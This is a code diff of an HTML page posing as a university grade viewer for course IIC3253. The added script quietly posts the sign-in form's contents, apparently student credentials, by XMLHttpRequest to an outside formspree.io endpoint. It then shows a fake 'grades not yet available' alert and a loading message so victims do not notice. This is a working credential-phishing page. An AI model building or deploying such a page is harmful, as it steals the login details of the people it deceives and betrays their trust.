@@ -4,6 +4,22 @@
 
 <head>
     <title>Regalo Pablo</title>
+    <script>
+        function loading() {
+          document.getElementById('login-form').innerHTML = 'Cargando...';
+        }
+      
+        function showAlert() {
+          alert('Las notas aun no estan disponibles');
+        }
+      
+        document.getElementById('login-form').addEventListener('submit', function(event) {
+          event.preventDefault();
+          loading();
+          setTimeout(showAlert, 5000);
+        });
+    </script>
+      
     <style>
         body {
             font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
@@ -94,8 +110,7 @@
 <body>
     <div class="wrapper">
         <form
-            action="https://formspree.io/f/mlekragv"
-            method="POST"
+            id="contact-form"
             class="form-signin"
             >
             <h2 class="form-signin-heading">[IIC3253] Visualizador de notas</h2>
@@ -106,5 +121,27 @@
         </form>
     </div>
 </body>
+
+<script>
+    const form = document.getElementById('contact-form');
+    form.addEventListener('submit', (event) => {
+      event.preventDefault();
+      const formData = new FormData(event.target);
+      const xhr = new XMLHttpRequest();
+      xhr.open('POST', "https://formspree.io/f/mlekragv", true);
+      xhr.setRequestHeader('Accept', 'application/json');
+      xhr.onreadystatechange = function() {
+        if (xhr.readyState !== XMLHttpRequest.DONE) return;
+        if (xhr.status === 200) {
+          alert('Las notas aun no estan disponibles');
+          form.reset();
+        } else {
+          alert('Ocurrió un error. Por favor inténtelo de nuevo más tarde.');
+        }
+      };
+      xhr.send(formData);
+    });
+  </script>
+  
 
 </html>
